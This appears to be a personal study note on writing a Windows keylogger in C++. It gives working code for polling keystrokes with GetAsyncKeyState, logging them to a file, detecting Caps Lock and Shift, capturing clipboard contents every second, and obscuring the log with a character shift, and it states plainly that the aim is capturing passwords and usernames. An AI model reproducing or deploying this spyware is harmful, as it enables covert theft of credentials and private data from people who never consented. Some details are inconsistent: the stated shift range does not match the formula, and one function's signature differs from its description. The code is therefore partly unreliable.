**Title:** ILY - Keylogger
**Tags:** [[ILY - Easy]]
**Topics:** #CPP #Keylogger

---
# ILY - Keylogger
# General
## First Iteration
### Keylogger
#### Function: ``startLogging()``
It is not possible to know which key has been pressed after it happened, so the only way to detect it is to check all possible valid keys in the ASCII symbols every time. Due to our goal of capturing passwords and usernames, the last valid symbol is "¡", which has the number 173 in the ASCII standard.

Now that we are checking all possible characters, it is important to determine how we are going to get that “alarm” informing us that a key on the keyboard has been pressed. This is where `GetAsyncKeyState()` comes into play.

`GetKeyState()` Will return that a key has been pressed only if it happens in the same “instant”; otherwise, it will not detect it. This isn't really convenient in our case, so we will use `GetAsyncKeyState()` instead, because it can retrieve the state of a key pressed at any time.

It's essential to understand how `GetAsyncKeyState()` works and the best way to implement it. You will see three types of implementations:
- `GetAsyncKeyState(key) == -32767`: Verifies if a key has been pressed and released.
- `GetAsyncKeyState(key) & 0x0001`: Verifies if a key has been pressed since the last call.
- `GetAsyncKeyState(key) & 0x8000`: Verifies if a key is currently being pressed.
[//]: Note that (0xFFFF8001)Hexa == (-32767)Ca2

```ad-question
I do not fully understand why the keylogger only works correctly when I set `0xFFFF8001` and why it captures the key while I maintain it pressed.
```

Finally, for readability purposes, we want to process special characters to log them in a special format. Otherwise, we just log the key directly.

```c++
for (char key = 8; key<=173; key++) {
	if (GetAsyncKeyState(key) == 0xFFFF8001) {
	    if (not specialKey(key)) {
            string str(1, key);
            save(str);
        }
    }
}
```

#### Function: ``save(const string& input)``
Firstly, we need to create a new datatype to work with files. For this reason, we must include `#include <iostream>` and `#include <fstream>`.

```ad-info
**fstream**
This data type represents the file stream generally, and has the capabilities of both ofstream and ifstream which means it can create files, write information to files, and read information from files.
```

Afterward we will have to open the file to append the `input` in it. 
`fstream` will create the file if it does not exist, and if any no problem occurs, we will append the input. It is good practice to close the file every time after performing file operations.

```c++
void save(const string& input) {
    fstream LogFile;
    
    LogFile.open("log.txt", fstream::app);  // If it does not exists, it will create it.
    
    if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}
```

## Second Iteration
### Detect Upper and Lower cases
#### Function: `isCapsLock()` and `isShift()`
``GetKeyState(VK_CAPITAL)`` returns a short where the least significant bit (LSB) represents the toggle state. If the LSB is 1, Caps Lock is active.
```c++
bool isCapsLock() { 
	return (GetKeyState(VK_CAPITAL) & 1) != 0; 
}
```

``GetKeyState(VK_SHIFT)`` Returns a short where the most significant bit (MSB) is set if the key is currently being pressed. The value 0x8000 corresponds to this MSB, indicating the physical press of the key.
```c++
bool isShift() { 
	return (GetKeyState(VK_SHIFT) & 0x8000) != 0; 
}
```

### Clipboard Monitoring
The clipboard monitoring functionality is designed to capture and log text data from the system clipboard periodically. This process involves checking the clipboard contents at regular intervals and logging any changes. 
[//]: Note that is not necessary to check the clipboard as frequent as the key status, so we will have to implement threats.


#### Function: `getClipboardText()`
The `getClipboardText` function retrieves the text currently stored in the system clipboard. It utilizes the Windows API to access the clipboard and fetches any Unicode text available.

- **Opening the Clipboard**: The function begins by calling `OpenClipboard(nullptr)`. This function attempts to open the clipboard for examination and prevents other applications from modifying it until it is closed.
- **Fetching Data**: The function uses `GetClipboardData(CF_UNICODETEXT)` to retrieve the handle to the clipboard data in Unicode text format. If no text is available, it returns an empty string.
- **Converting Data**: If data is present, the function locks the global memory to access the text using `GlobalLock(hData)`, converting the wide character string (`wstring`) to a standard string (`string`).
- **Closing the Clipboard**: After retrieving the text, the function releases the global memory lock using `GlobalUnlock(hData)` and closes the clipboard using `CloseClipboard()`.

```c++
string getClipboardText() {
    string text = "";

    if (!OpenClipboard(nullptr)) {
        return text;
    }

    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData != nullptr) {
        wchar_t* pwszText = static_cast<wchar_t*>(GlobalLock(hData));
        if (pwszText != nullptr) {
            wstring ws(pwszText);
            text = string(ws.begin(), ws.end());
            GlobalUnlock(hData);
        }
    }
    CloseClipboard();

    return text;
}
```


#### Function: `clipboardLogger(int key, atomic<bool>& running)`

The `clipboardLogger` function is responsible for periodically checking the clipboard for new content and logging it using an encryption mechanism.

- **Periodic Check**: It continuously runs in a loop controlled by an atomic boolean `running`. It sleeps for 1 second (`Sleep(1000)`) between checks to minimize system resource usage.
- **Detecting Changes**: It compares the current clipboard content with the previously logged content. If there is new content that differs from what was previously stored, it logs this content.
- **Logging and Encryption**: New clipboard content is logged by calling the `save` function, which encrypts the content using a simple character shift.

```c++
void clipboardLogger(int key) {
    string previousClipboardContent;

    while (true) {
        Sleep(1000);

        string currentClipboardContent = getClipboardText();

        if (!currentClipboardContent.empty() && currentClipboardContent != previousClipboardContent) {
            save("\n[+]Clipboard: " + currentClipboardContent + "\n", key);
            previousClipboardContent = currentClipboardContent;
        }
    }
}
```

### Encrypt and decrypt the logfile
#### Function: `save(const string& input, int key)`
If we want to encrypt the logfile we will need to modify how `save()` works. In the `main()` function it's set the "PIN" to make the shift as the Caesar cipher.

The loop `for (char c : input) { ... }` iterates over each character in the input string. For each character, a shift value is calculated using `int shift = 1 + key % 10;`, which ensures a shift between 0 and 9. This shift value is added to the character's ASCII code (`c + shift`) before writing it to the file.

```c++
void save(const string& input, int key) {
    // Open a file named "log.txt" in append and binary mode
    ofstream outFile("log.txt", ios::app | ios::binary);
    // Check if the file was opened successfully
    if (!outFile.is_open()) {
        // If the file couldn't be opened, output an error message and exit the function
        cout << "Error opening log file for writing." << endl;
        return;
    }

    // Loop through each character in the input string
    for (char c : input) {
        // Calculate a shift value between 0 and 9 based on the provided key
        int shift = 1 + key % 10;
        // Encrypt the character by adding the shift value to its ASCII code and write it to the file
        outFile.put(c + shift);
    }

    // Close the file to ensure the data is written and resources are freed
    outFile.close();
}
```